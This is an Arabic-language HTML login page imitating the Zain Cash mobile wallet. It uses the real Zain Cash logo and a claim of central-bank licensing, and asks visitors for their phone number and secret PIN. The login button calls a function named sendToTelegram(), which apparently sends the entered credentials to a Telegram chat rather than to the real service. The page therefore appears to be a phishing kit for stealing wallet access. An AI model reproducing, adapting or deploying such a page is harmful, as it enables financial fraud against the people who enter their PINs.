<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Zain Cash Login</title>
    <link rel="stylesheet" href="styles.css">
</head>
<body>
    <div class="container">
        <div class="header-logo">
            <img src="https://mobileapi.zaincash.iq/logo.png" alt="Zain Cash Logo">
        </div>
        <h2 style="color: #FFFFFF;">أهلاً بك</h2>
        <p style="color: #FFFFFF; font-size: 16px;">تسجيل دخول من خلال محفظة زين كاش</p>
        <div class="form-container">
            <label for="phone">أدخل رقم الهاتف</label>
            <input type="tel" id="phone" placeholder="+964" pattern="[0-9+]*">
            <label for="pin">الرمز السري لزين كاش</label>
            <input type="password" id="pin" placeholder="الرمز السري" inputmode="numeric" pattern="[0-9]*">
            <button onclick="sendToTelegram()">تسجيل الدخول</button>
            <a href="#" class="get-new-code" style="color: #000;">الحصول على رمز سري جديد</a>
            <a href="#" class="register-new" style="color: #000;">اضغط هنا لتسجيل محفظة جديدة</a>
        </div>
        <div class="footer">
            <div class="footer-icon">
                <img src="https://www9.0zz0.com/2024/06/08/09/214838799.png" alt="Location Icon">
            </div>
            <p>أقرب مركز معتمد</p>
            <p>زين كاش مرخصة من قبل البنك المركزي العراقي</p>
        </div>
    </div>
    <script src="script.js"></script>
</body>
</html>
